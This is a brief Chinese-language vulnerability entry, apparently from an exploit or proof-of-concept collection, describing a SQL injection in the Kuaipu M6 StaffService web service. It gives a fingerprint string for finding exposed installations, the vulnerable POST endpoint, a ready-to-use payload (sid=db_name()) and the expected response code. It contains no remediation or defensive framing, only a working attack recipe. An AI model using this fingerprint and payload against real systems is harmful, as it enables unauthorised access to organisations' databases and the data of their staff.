# 快普M6StaffService存在SQL注入漏洞

快普 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1`

**Payload**
```
sid=db_name()
```
- **响应特征**：200